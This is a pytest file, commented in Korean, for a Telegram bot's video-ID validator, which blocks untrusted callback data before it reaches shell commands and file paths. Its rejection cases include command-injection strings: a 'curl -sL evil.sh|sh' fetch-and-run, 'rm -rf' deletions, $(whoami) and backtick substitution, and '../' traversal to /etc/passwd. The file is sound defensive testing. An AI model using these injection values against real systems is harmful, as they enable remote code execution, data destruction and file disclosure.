"""callback_data의 video_id 검증 — shell=True 명령과 파일 경로에 들어가기 전에 막는다.

배경: query.data는 봇이 만든 버튼이라도 신뢰할 수 없다. MTProto 클라이언트는
임의의 64바이트를 보낼 수 있고, 그 값이 f-string으로 셸 명령에 들어갔다.
"""
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from services.validation import valid_video_id  # noqa: E402


@pytest.mark.parametrize("vid", [
    "YT-20260425-004",
    "YT-20260425-004-JA",
    "YT-20260425-004-S01",
    "YT-20260425-004-JA-S04",
])
def test_정상_ID는_통과(vid):
    assert valid_video_id(vid)


@pytest.mark.parametrize("vid", [
    "x;curl -sL evil.sh|sh;#",          # 명령 주입
    "YT-20260425-004;rm -rf ~",
    "YT-20260425-004 && echo pwned",
    "$(whoami)",
    "`id`",
    "../../../../etc/passwd",            # 경로 탈출
    "YT-20260425-004/../../../tmp/x",
    "YT-2026042-004",                    # 날짜 자릿수 부족
    "YT-20260425-04",                    # 번호 자릿수 부족
    "yt-20260425-004",                   # 소문자
    "YT-20260425-004-KR",                # 없는 시장
    "YT-20260425-004\nrm -rf /",         # 개행
    "",
    None,
])
def test_비정상_ID는_거부(vid):
    assert not valid_video_id(vid)


def test_개행_포함은_전체_검사로_막힌다():
    """re.match는 $ 가 개행 앞에도 맞아 통과할 수 있다 — 실제로 막히는지 고정한다."""
    assert not valid_video_id("YT-20260425-004\nwhoami")
